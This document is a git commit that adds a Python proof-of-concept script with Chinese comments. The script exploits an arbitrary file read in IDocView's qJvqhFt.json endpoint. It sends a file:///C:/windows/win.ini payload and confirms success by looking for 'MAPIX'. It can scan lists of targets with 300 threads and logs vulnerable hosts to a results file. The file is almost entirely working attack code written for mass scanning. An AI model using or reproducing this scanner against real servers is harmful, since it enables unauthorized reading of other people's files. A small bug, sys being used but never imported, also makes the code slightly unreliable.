ebdf5f75791da936bd90b279991e973bf062aa80
wyn-lk <cloundside@gmail.com>
2024-07-01 20:48:59 +0800

    Add files via upload

---
+++ POC/IDocView_qJvqhFt接口任意文件读取/1.py
@@ -0,0 +1,70 @@
+# 
+import requests,argparse,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 解除警告
+GREEN = '\033[92m'
+RESET = '\033[0m'
+proxies = { 
+       "http": "http://127.0.0.1:8080", 
+       "https": "http://127.0.0.1:8080" 
+       }
+def banner():
+	banner = """
+
+	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
+██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
+██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
+██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
+╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
+ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
+                                     info:IDocView_qJvqhFt接口任意文件读取
+	"""
+	print(banner)
+def poc(target):
+	payload_url = "/view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi"
+	url = target + payload_url
+	headers={
+		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36',
+		'Connection': 'close',
+		'Accept-Encoding': 'gzip, deflate'
+	}
+
+	try:
+		res = requests.get(url=target,verify=False)
+		res1 = requests.get(url=url,headers=headers,verify=False)
+		if res.status_code == 200:
+			if res1.status_code == 200 and "MAPIX" in res1.text:
+		
+				print(f"{GREEN}[+]该url存在任意文件读取漏洞：{target}{RESET}")
+				with open("result.txt","a",encoding="utf-8") as f:
+					f.write(target+"\n")
+			else:
+				print(f"[-]该url不存在任意文件读取漏洞：{target}")
+		else:
+			print(f"该url连接失败：{target}")
+	except:
+		print(f"[*]该url出现错误：{target}")
+
+def main():
+	banner()
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
+	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
+	args = parser.parse_args()
+	if args.url and not args.file:
+		poc(args.url)
+	elif args.file and not args.url:
+		url_list = []
+		with open(args.file,"r",encoding="utf-8") as f:
+			for i in f.readlines():
+				url_list.append(i.strip().replace("\n",""))
+		mp = Pool(300)
+		mp.map(poc,url_list)
+		mp.close()
+		mp.join()
+	else:
+		print(f"\n\tUage:python {sys.argv[0]} -h")
+
+
+if __name__ == "__main__":
+	main()
